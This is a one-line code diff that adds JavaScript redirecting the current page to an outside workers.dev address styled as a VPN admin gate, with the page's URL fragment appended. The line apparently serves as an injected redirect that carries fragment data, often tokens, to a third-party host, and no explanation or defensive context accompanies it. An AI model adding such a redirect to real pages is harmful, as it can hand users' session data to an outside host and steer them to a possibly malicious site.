@@ -1,0 +1,1 @@
+location.replace("https://ostix-vpn-admin-gate.gambit-lab-7bz-bot.workers.dev/admin-demo/"+location.hash)
